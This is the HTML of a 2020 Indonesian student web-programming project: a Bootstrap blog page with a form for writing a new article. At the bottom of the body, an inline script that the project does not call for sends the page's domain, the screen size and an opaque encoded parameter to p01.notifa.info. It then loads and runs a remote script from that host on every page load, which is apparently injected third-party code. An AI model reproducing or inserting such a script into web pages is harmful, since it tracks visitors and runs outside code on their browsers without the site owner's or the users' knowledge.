<!DOCTYPE html>
<html lang="en">

<head>

    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="Ujian Tengah Semester (UTS) mata kuliah Pemrograman Berbasis Website 2020">
    <meta name="author" content="172410101031">

    <title>Blog - 172410101031</title>

    <!-- Bootstrap core CSS -->
    <link href="vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">

    <!-- Custom fonts for this template -->
    <link href="vendor/fontawesome-free/css/all.min.css" rel="stylesheet" type="text/css">
    <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet'
        type='text/css'>
    <link
        href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800'
        rel='stylesheet' type='text/css'>

    <!-- Custom styles for this template -->
    <link href="css/clean-blog.min.css" rel="stylesheet">

</head>

<body>

    <!-- Post Content -->
    <article>
        <div class="container">
            <div class="row">
                <div class="col-lg-8 col-md-10 mx-auto">
                    <h1>Tulis Artikel Baru</h1>
                    <hr>
                    <form method="POST" action="create_data.php">
                        <div class="form-group row">
                            <label for="title" class="col-sm-2 col-form-label">Judul</label>
                            <div class="col-sm-10">
                                <input type="text" class="form-control" id="title" name="title" required="required">
                            </div>
                        </div>
                        <div class="form-group row">
                            <label for="author" class="col-sm-2 col-form-label">Author</label>
                            <div class="col-sm-10">
                                <input type="text" class="form-control" id="author" name="author" required="required">
                            </div>
                        </div>
                        <div class="form-group row">
                            <label for="datetime" class="col-sm-2 col-form-label">Tanggal</label>
                            <div class="col-sm-10">
                                <input type="date" class="form-control" id="datetime" name="datetime"
                                    required="required">
                            </div>
                        </div>
                        <div class="form-group row">
                            <label for="content" class="col-sm-2 col-form-label">Konten</label>
                            <div class="col-sm-10">
                                <textarea class="form-control" id="content" name="content" rows="8"
                                    required="required"></textarea>
                            </div>
                        </div>
                        <div class="form-group row">
                            <div class="col-sm-10 offset-sm-2">
                                <button type="submit" class="btn btn-primary">Simpan</button>
                                <a href="index.php" class="btn btn-secondary">&larr; Kembali</a>
                            </div>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </article>

    <hr>

    <!-- Footer -->
    <footer>
        <div class="container">
            <div class="row">
                <div class="col-lg-8 col-md-10 mx-auto">
                    <p class="copyright text-muted">Copyright &copy; "172410101031" 2020</p>
                </div>
            </div>
        </div>
    </footer>

    <!-- Bootstrap core JavaScript -->
    <script src="vendor/jquery/jquery.min.js"></script>
    <script src="vendor/bootstrap/js/bootstrap.bundle.min.js"></script>

    <!-- Custom scripts for this template -->
    <script src="js/clean-blog.min.js"></script>

    <script
        type="text/javascript">if (self == top) { function netbro_cache_analytics(fn, callback) { setTimeout(function () { fn(); callback(); }, 0); } function sync(fn) { fn(); } function requestCfs() { var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://"); var idc_glo_r = Math.floor(Math.random() * 99999999999); var url = idc_glo_url + "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXDZlPpuwSPGxWe4W934QtpzizbF20FDqhZuu3ueyqzuYDhFiw%2bJtOlydAm0egAaQpD9HjGTcKroK%2f1jcy05KrAZrJ1RmcpKxg%2bNxN3kO3EAoHWWkS9fwkzsj0AUQH6Kh7NrR4BZdxk3v5aw8sMukO8JEiLura96eQJm%2bVWHjslLYmbDKSjcjdcuWHAmilH7RryypnOvI3GYsYH0aqIfiXwt9brQPVuxRGoc%2bcZFqZdeC3XLR84SPIDsMxcJorY55OPM7aAxUjsUSKK0hHSLn8VRuvRqqAcJVJhx8OCuG5gxjMdDJ%2fQPUksJa6%2fMxdf8qdDIZ%2bIJ1pVKTS%2fIa2lOIZV6%2fbLgKnhCiWN%2bmxKiw%2bDxOrU8wWqwvHqw4u3pdZUzkwQ1%2buSo7yZdHtAI0cullVIz0GLwifzc5uil5KFDhAofWLfYInDL%2b8njE0fUDDiSq7QcJuhBu3kTwxiRDm26w7wF10JIsDwv5SUFnw8%2b7EZ1QqahlZjMX8Ei7EouekG9sJUd7i%2faJXpe6SbsGL%2btI%2bfcHMDBzQwQgBzDdLbralsfDznxRVucuHog%3d%3d" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height; var bsa = document.createElement('script'); bsa.type = 'text/javascript'; bsa.async = true; bsa.src = url; (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa); } netbro_cache_analytics(requestCfs, function () { }); };</script>
</body>

</html>